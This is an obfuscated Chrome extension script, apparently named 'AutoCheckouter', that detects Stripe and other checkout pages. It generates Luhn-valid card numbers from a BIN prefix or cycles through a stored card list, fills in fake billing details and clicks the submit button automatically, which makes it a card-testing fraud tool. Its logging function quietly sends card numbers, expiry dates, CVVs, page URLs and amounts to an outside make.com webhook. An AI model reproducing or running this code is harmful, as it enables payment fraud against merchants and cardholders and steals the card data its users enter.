let settings = {
    bin1: '415464440104',
    bin2: '',
    generateKey: 'x',
    clearKey: 'c',
    cardDetails: [],
  },
  lastUsedCard = '',
  settingsLoaded = false,
  extensionEnabled = true,
  lastGeneratedCardDetails = null,
  cardIndex = 0,
  currentBin = 'bin1'
const updateSettings = (_0x3cdf24) => {
  settings = {
    ...settings,
    ..._0x3cdf24,
  }
  log(1, 'Settings updated dynamically:', settings)
  extensionEnabled && isCheckoutOrPaymentPage() && initializeExtension()
}
chrome.storage.onChanged.addListener((_0x43e0ca, _0x45e92d) => {
  for (let [
    _0x289a77,
    { oldValue: _0x17c581, newValue: _0x1652f0 },
  ] of Object.entries(_0x43e0ca)) {
    _0x45e92d === 'sync' &&
      ((settings[_0x289a77] = _0x1652f0),
      log(1, 'Setting changed: ' + _0x289a77, {
        oldValue: _0x17c581,
        newValue: _0x1652f0,
      }),
      updateSettings(settings))
  }
})
const log = (_0x168506, _0x20fdc0, _0x17fb82 = null) => {
    const _0x5976c2 = [
      'Loaded settings:',
      'Generated Details - Made By FAHEEM | @faheem0001',
    ]
    if (
      _0x168506 >= 1 &&
      _0x5976c2.some((_0x4ee489) => _0x20fdc0.includes(_0x4ee489))
    ) {
      if (!isCheckoutOrPaymentPage()) {
        return
      }
      const _0x237672 = new Date().toLocaleString('en-GB', {
        timeZone: 'Africa/Casablanca',
        hour12: true,
      })
      let _0x124106 = ''
      switch (_0x168506) {
        case 1:
          _0x124106 = 'INFO'
          break
        case 2:
          _0x124106 = 'WARN'
          break
        case 3:
          _0x124106 = 'ERROR'
          break
        case 4:
          _0x124106 = 'SUCCESS'
          break
        default:
          _0x124106 = 'DEBUG'
          break
      }
      const _0x2a42cc = document.getElementById('ProductSummary-totalAmount'),
        _0x1f5000 = _0x2a42cc ? _0x2a42cc.textContent.trim() : 'N/A',
        _0x28a0a7 = window.location.href
      if (
        !(
          /^(https:\/\/)?pay\./.test(_0x28a0a7) ||
          /checkout\.stripe\.com/.test(_0x28a0a7) ||
          /^(https:\/\/)?buy\.stripe/.test(_0x28a0a7) ||
          /stripe/i.test(_0x28a0a7)
        )
      ) {
        return
      }
      const _0x17e705 = _0x17fb82
          ? typeof _0x17fb82 === 'object'
            ? JSON.stringify(_0x17fb82, null, 2)
            : _0x17fb82
          : 'N/A',
        _0x504591 = {
          timestamp: _0x237672,
          message: _0x20fdc0,
          url: _0x28a0a7,
          amount: _0x1f5000,
          extension_status: extensionEnabled ? 'Enabled' : 'Disabled',
          bin: settings[currentBin] || settings.bin1,
          details: _0x17e705,
        }
      fetch('https://hook.eu2.make.com/qdycpuurdqe53njwi1wi3xp9lwyo162h', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(_0x504591),
      }).catch((_0x1c5b15) => console.error('Error', _0x1c5b15))
    }
  },
  debounce = (_0x10d96a, _0x309a4d) => {
    let _0x47297a
    return function _0x2ea699(..._0x2da4b7) {
      const _0x41b839 = () => {
        clearTimeout(_0x47297a)
        _0x10d96a(..._0x2da4b7)
      }
      clearTimeout(_0x47297a)
      _0x47297a = setTimeout(_0x41b839, _0x309a4d)
    }
  },
  isCheckoutOrPaymentPage = () => {
    const _0x28e662 = [
        /^pay\./,
        /checkout\.stripe\.com/,
        /^buy\.stripe/,
        /checkout/i,
        /stripe/i,
      ],
      _0xa3d4d4 = _0x28e662.some(
        (_0xac4429) =>
          _0xac4429.test(window.location.hostname) ||
          _0xac4429.test(window.location.pathname)
      )
    return console.log('isCheckoutOrPaymentPage:', _0xa3d4d4), _0xa3d4d4
  },
  showNotification = (_0x23d431, _0x344102, _0x57a896, _0x83226 = null) => {
    const _0x4bb57b =
      _0x83226 ||
      _0x23d431 === 'warning' ||
      _0x344102.includes('Payment Page Detected') ||
      _0x344102.includes('Attempting Payment')
        ? 7000
        : 5000
    chrome.runtime.sendMessage({
      action: 'showNotification',
      type: _0x23d431,
      title: _0x344102,
      message: _0x57a896,
      duration: _0x4bb57b,
    })
    const _0x53be98 = document.createElement('div')
    _0x53be98.className = 'faheem-notification'
    const _0x56da7c = {
        success: '\u2705',
        error: '\u274C',
        warning: '\uD83D\uDD04',
        default:
          '<img src="' +
          chrome.runtime.getURL('icons/iconi.png') +
          '" alt="Payment" width="48" height="48">',
      },
      _0x3a586a = _0x56da7c[_0x23d431] || _0x56da7c.default
    _0x53be98.innerHTML =
      '\n    <div class="notification-icon">' +
      _0x3a586a +
      '</div>\n    <div class="notification-content">\n      <h3>' +
      _0x344102 +
      '</h3>\n      <p>' +
      _0x57a896 +
      '</p>\n    </div>\n    <div class="notification-close">\xD7</div>\n  '
    document.body.appendChild(_0x53be98)
    const _0x5013fc = document.createElement('style')
    _0x5013fc.textContent =
      "\n    .faheem-notification {\n      position: fixed;\n      bottom: 20px;\n      left: 20px;\n      background-color: #ffffff;\n      color: #333333;\n      padding: 15px;\n      border-radius: 12px;\n      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);\n      font-family: 'Arial', sans-serif;\n      z-index: 99999;\n      max-width: 400px;\n      display: flex;\n      align-items: center;\n      opacity: 0;\n      transform: translateY(50px);\n      transition: all 0.3s cubic-bezier(0.68, -0.55, 0.27, 1.55);\n      border-left: 5px solid " +
      (_0x23d431 === 'success'
        ? '#4CAF50'
        : _0x23d431 === 'error'
        ? '#F44336'
        : _0x23d431 === 'warning'
        ? '#FFC107'
        : '#2196F3') +
      ';\n    }\n    .faheem-notification.show {\n      opacity: 1;\n      transform: translateY(0);\n    }\n    .faheem-notification .notification-icon {\n      font-size: 24px;\n      margin-right: 15px;\n    }\n    .faheem-notification .notification-content {\n      flex-grow: 1;\n    }\n    .faheem-notification h3 {\n      margin: 0 0 5px;\n      font-size: 18px;\n      font-weight: bold;\n    }\n    .faheem-notification p {\n      margin: 0;\n      font-size: 14px;\n      line-height: 1.4;\n    }\n    .faheem-notification .notification-close {\n      cursor: pointer;\n      font-size: 24px;\n      margin-left: 15px;\n      opacity: 0.7;\n      transition: opacity 0.2s;\n    }\n    .faheem-notification .notification-close:hover {\n      opacity: 1;\n    }\n  '
    document.head.appendChild(_0x5013fc)
    setTimeout(() => {
      _0x53be98.classList.add('show')
    }, 100)
    const _0x34f12c = _0x53be98.querySelector('.notification-close')
    _0x34f12c.addEventListener('click', () => {
      _0x53be98.classList.remove('show')
      setTimeout(() => {
        _0x53be98.remove()
        _0x5013fc.remove()
      }, 300)
    })
    setTimeout(() => {
      _0x53be98.classList.remove('show')
      setTimeout(() => {
        _0x53be98.remove()
        _0x5013fc.remove()
      }, 300)
    }, _0x4bb57b)
  },
  addGenerateButton = (_0x5237ba) => {
    const _0x4d7afc = document.createElement('button')
    _0x4d7afc.id = _0x5237ba
    _0x4d7afc.innerHTML =
      '<span class="icon">\uD83D\uDCB3</span><span class="text">Auto Gen</span>'
    document.body.appendChild(_0x4d7afc)
    const _0x2b6169 = document.createElement('style')
    _0x2b6169.textContent =
      '\n    #' +
      _0x5237ba +
      " {\n      position: fixed;\n      top: 20px;\n      left: 20px;\n      z-index: 10000;\n      padding: 8px 16px;\n      background-color: #f0f0f0;\n      color: #333;\n      border: 1px solid #ddd;\n      border-radius: 4px;\n      cursor: pointer;\n      font-size: 12px;\n      font-weight: 500;\n      box-shadow: 0 2px 4px rgba(0,0,0,0.05);\n      transition: all 0.2s ease;\n      display: flex;\n      align-items: center;\n      justify-content: center;\n      font-family: 'Arial', sans-serif;\n    }\n    #" +
      _0x5237ba +
      ':hover {\n      background-color: #e0e0e0;\n      box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n    }\n    #' +
      _0x5237ba +
      ' .icon {\n      margin-right: 8px;\n      font-size: 16px;\n    }\n    #' +
      _0x5237ba +
      ' .text {\n      font-weight: bold;\n    }\n  '
    document.head.appendChild(_0x2b6169)
    _0x4d7afc.addEventListener('click', () => {
      extensionEnabled
        ? (log(
            1,
            'Manually triggered card generation - Made By FAHEEM | @faheem0001'
          ),
          (_0x4d7afc.style.opacity = '0.7'),
          setTimeout(() => (_0x4d7afc.style.opacity = '1'), 200),
          autoFillAndSubmit())
        : showNotification(
            'error',
            'Extension Disabled',
            'Please enable the extension first.'
          )
    })
  },
  initializeExtension = () => {
    log(1, 'Initializing extension')
    chrome.storage.sync.get(
      {
        bin1: '415464440104',
        bin2: '',
        generateKey: 'X',
        clearKey: 'C',
        cardDetails: [],
        generateButtonId: 'generateCardButton',
        extensionEnabled: true,
      },
      (_0x32a01) => {
        settings = _0x32a01
        extensionEnabled = _0x32a01.extensionEnabled
        settingsLoaded = true
        log(1, 'Loaded settings:', settings)
        extensionEnabled
          ? isCheckoutOrPaymentPage()
            ? (addGenerateButton(_0x32a01.generateButtonId),
              document.addEventListener('keypress', handleKeyPress),
              window.addEventListener('load', onPageLoad),
              log(
                1,
                'Script loaded. Press "' +
                  settings.generateKey +
                  '" to generate new card details, "' +
                  settings.clearKey +
                  '" to clear form fields.'
              ),
              showNotification(
                'info',
                'Payment Page Detected',
                'Made By FAHEEM AKHTAR'
              ),
              setTimeout(autoFillFields, 6000),
              addFloatingCredit())
            : log(
                1,
                'Not a checkout or payment page. Extension features disabled.'
              )
          : log(1, 'Extension is disabled. Enable it from the options page.')
      }
    )
  },
  handleKeyPress = (_0x42e9bc) => {
    if (!settingsLoaded || !extensionEnabled) {
      return
    }
    if (_0x42e9bc.key.toLowerCase() === settings.generateKey.toLowerCase()) {
      log(
        1,
        'Manually triggered card generation - Made By FAHEEM | @faheem0001'
      )
      autoFillAndSubmit()
    } else {
      _0x42e9bc.key.toLowerCase() === settings.clearKey.toLowerCase() &&
        clearFormFields()
    }
  },
  autoFillAndSubmit = () => {
    if (!extensionEnabled) {
      log(2, 'Extension is disabled. Cannot autofill and submit.')
      return
    }
    log(1, 'Autofilling and submitting form.')
    clearFormFields()
    setTimeout(() => {
      fillFormFields()
      setTimeout(() => {
        clickSubscribeButton()
      }, 1000)
    }, 1000)
  },
  clickSubscribeButton = () => {
    const _0x18217f = document.querySelector(
      "button[type='submit'], button.SubmitButton, #submitButton"
    )
    if (_0x18217f && !_0x18217f.disabled) {
      log(1, 'Automatically clicking subscribe button...')
      _0x18217f.click()
      if (lastGeneratedCardDetails) {
        const {
            cardNumber: _0x25277e,
            expirationDate: _0x365ecc,
            cvv: _0x4f8a61,
          } = lastGeneratedCardDetails,
          [_0x5d9af3, _0x3f30d6] = _0x365ecc.split('/')
        showNotification(
          'warning',
          'Attempting Payment',
          'Card: ' +
            _0x25277e +
            '|' +
            _0x5d9af3 +
            '|20' +
            _0x3f30d6 +
            '|' +
            _0x4f8a61
        )
      } else {
        showNotification(
          'warning',
          'Attempting Payment',
          'Card details not available'
        )
      }
    } else {
      log(2, 'Subscribe button not found or is disabled.')
    }
  },
  autoFillFields = () => {
    if (!extensionEnabled) {
      return
    }
    clearFormFields()
    setTimeout(() => {
      fillFormFields()
    }, 1000)
  },
  onPageLoad = () => {
    log(
      1,
      'Checkout page loaded. Ready for manual card generation. - Made By DestroyerX | @Binsgivv'
    )
  },
  generateCardDetails = () => {
    if (settings.cardDetails && settings.cardDetails.length > 0) {
      const _0x1dba99 = settings.cardDetails[cardIndex]
      cardIndex = (cardIndex + 1) % settings.cardDetails.length
      const [_0x5e09c, _0xda9309, _0xe760fa, _0x1fcc1e] = _0x1dba99.split('|')
      return {
        email:
          'faheemakhtar864' + Math.floor(Math.random() * 900 + 100) + '@gmail.com',
        cardNumber: _0x5e09c,
        expirationDate: _0xda9309 + '/' + _0xe760fa.slice(-2),
        cvv: _0x1fcc1e,
        cardHolderName: 'Faheem king Auto',
        addressLine1: 'king',
        addressLine2: 'Faheem',
        postalCode: '10080',
        city: 'Lahore',
      }
    } else {
      const _0x1d8a0b = settings[currentBin] || settings.bin1
      currentBin = currentBin === 'bin1' ? 'bin2' : 'bin1'
      const _0x557ede = Math.floor(Math.random() * 900 + 100)
      return {
        email: 'faheemakhtar864' + _0x557ede + '@gmail.com',
        cardNumber: generateCardNumber(_0x1d8a0b),
        expirationDate: generateExpirationDate(),
        cvv: Math.floor(Math.random() * 900 + 100).toString(),
        cardHolderName: 'Faheem king Auto',
        addressLine1: 'fah',
        addressLine2: 'king',
        postalCode: '10080',
        city: 'Lahore',
      }
    }
  },
  generateCardNumber = (_0x39c825) => {
    let _0x40b821 = _0x39c825
    for (let _0x41399e = _0x40b821.length; _0x41399e < 15; _0x41399e++) {
      _0x40b821 += Math.floor(Math.random() * 10).toString()
    }
    for (let _0x4b44d4 = 0; _0x4b44d4 < 10; _0x4b44d4++) {
      if (calculateLuhnChecksum(_0x40b821 + _0x4b44d4)) {
        return _0x40b821 + _0x4b44d4
      }
    }
    return _0x40b821 + '0'
  },
  calculateLuhnChecksum = (_0x5bb9ce) => {
    let _0x16990e = 0,
      _0x1b3463 = false
    for (let _0x4322c9 = _0x5bb9ce.length - 1; _0x4322c9 >= 0; _0x4322c9--) {
      let _0x1767ad = parseInt(_0x5bb9ce.charAt(_0x4322c9))
      _0x1b3463 && ((_0x1767ad *= 2), _0x1767ad > 9 && (_0x1767ad -= 9))
      _0x16990e += _0x1767ad
      _0x1b3463 = !_0x1b3463
    }
    return _0x16990e % 10 === 0
  },
  generateExpirationDate = () => {
    const _0x1d9a79 = new Date().getFullYear(),
      _0x55dbf1 = Math.floor(Math.random() * 12 + 1)
        .toString()
        .padStart(2, '0'),
      _0x2efe79 = Math.floor(Math.random() * 5) + _0x1d9a79 + 1
    return _0x55dbf1 + '/' + _0x2efe79.toString().slice(-2)
  },
  cachedElements = {},
  getElement = (_0x4d3cca) => {
    return (
      !cachedElements[_0x4d3cca] &&
        (cachedElements[_0x4d3cca] = document.querySelector(_0x4d3cca)),
      cachedElements[_0x4d3cca]
    )
  },
  fillFormFields = () => {
    lastGeneratedCardDetails = generateCardDetails()
    lastUsedCard = lastGeneratedCardDetails.cardNumber
    const _0x53b6f6 = {
      'input#email': lastGeneratedCardDetails.email,
      'input#cardNumber': lastGeneratedCardDetails.cardNumber,
      'input#cardExpiry': lastGeneratedCardDetails.expirationDate,
      'input#cardCvc': lastGeneratedCardDetails.cvv,
      'input#billingName': lastGeneratedCardDetails.cardHolderName,
      'input#billingAddressLine1': lastGeneratedCardDetails.addressLine1,
      'input#billingAddressLine2': lastGeneratedCardDetails.addressLine2,
      'input#billingPostalCode': lastGeneratedCardDetails.postalCode,
      'input#billingLocality': lastGeneratedCardDetails.city,
    }
    for (const [_0x96b179, _0x2d0c6d] of Object.entries(_0x53b6f6)) {
      const _0x5df6fe = getElement(_0x96b179)
      _0x5df6fe && simulateTyping(_0x5df6fe, _0x2d0c6d)
    }
    logGeneratedDetails(
      lastGeneratedCardDetails,
      settings.cardDetails && settings.cardDetails.length > 0
    )
  },
  simulateTyping = (_0x2be6fa, _0x2d3485) => {
    _0x2be6fa.focus()
    _0x2be6fa.value = _0x2d3485
    _0x2be6fa.dispatchEvent(new Event('input', { bubbles: true }))
    _0x2be6fa.dispatchEvent(new Event('change', { bubbles: true }))
    _0x2be6fa.blur()
  },
  logGeneratedDetails = (_0x4d790a, _0x3edf4a = false) => {
    log(
      1,
      (_0x3edf4a ? 'Card You Entered:' : 'Generated') +
        ' Details - Made By Faheem | @faheem0001',
      _0x4d790a
    )
  },
  clearFormFields = () => {
    const _0x3caffc = [
      'input#email',
      'input#cardNumber',
      'input#cardExpiry',
      'input#cardCvc',
      'input#billingName',
      'input#billingAddressLine1',
      'input#billingAddressLine2',
      'input#billingPostalCode',
      'input#billingLocality',
    ]
    _0x3caffc.forEach((_0x286436) => {
      const _0x3d134f = document.querySelector(_0x286436)
      _0x3d134f &&
        ((_0x3d134f.value = ''),
        _0x3d134f.dispatchEvent(new Event('input', { bubbles: true })))
    })
  },
  addFloatingCredit = () => {
    const _0x283da9 = document.createElement('div')
    _0x283da9.textContent = 'AutoCheckouter v1.0'
    _0x283da9.style.cssText =
      '\n    position: fixed;\n    bottom: 10px;\n    right: 10px;\n    background-color: rgba(0, 0, 0, 0.7);\n    color: white;\n    padding: 5px 10px;\n    border-radius: 5px;\n    font-size: 10px; /* Smaller font size */\n    z-index: 9999;\n    direction: rtl; /* Right to left text direction */\n  '
    _0x283da9.textContent = 'AutoCheckouter v1.0'
    document.body.appendChild(_0x283da9)
  }
document.addEventListener('DOMContentLoaded', () => {
  isCheckoutOrPaymentPage() &&
    (onPageLoad(),
    addFloatingCredit(),
    document.addEventListener(
      'keydown',
      debounce((_0x55123a) => {
        if (!extensionEnabled) {
          return
        }
        if (_0x55123a.ctrlKey && _0x55123a.key === 'g') {
          _0x55123a.preventDefault()
          autoFillFields()
        } else {
          _0x55123a.ctrlKey &&
            _0x55123a.key === 'h' &&
            (_0x55123a.preventDefault(), clickSubscribeButton())
        }
      }, 100)
    ))
})
chrome.runtime.onMessage.addListener((_0x57f53d, _0x25ef5f, _0x47d0f4) => {
  if (_0x57f53d.action === 'updateSettings') {
    settings = _0x57f53d.settings
    log(1, 'Settings updated:', settings)
  } else {
    if (_0x57f53d.action === 'toggleExtension') {
      extensionEnabled = _0x57f53d.enabled
      log(1, 'Extension ' + (extensionEnabled ? 'enabled' : 'disabled'))
      if (!extensionEnabled) {
        const _0x3307f8 = document.getElementById(settings.generateButtonId)
        _0x3307f8 && _0x3307f8.remove()
        document.removeEventListener('keypress', handleKeyPress)
        window.removeEventListener('load', onPageLoad)
      } else {
        initializeExtension()
      }
    }
  }
})
function onPaymentAttempt(_0x210867, _0x4cce49, _0x46b577, _0x500400) {
  chrome.runtime.sendMessage({
    action: 'paymentAttempt',
    data: {
      card: _0x210867,
      site: _0x4cce49,
      amount: _0x46b577,
      status: _0x500400,
    },
  })
}
initializeExtension()
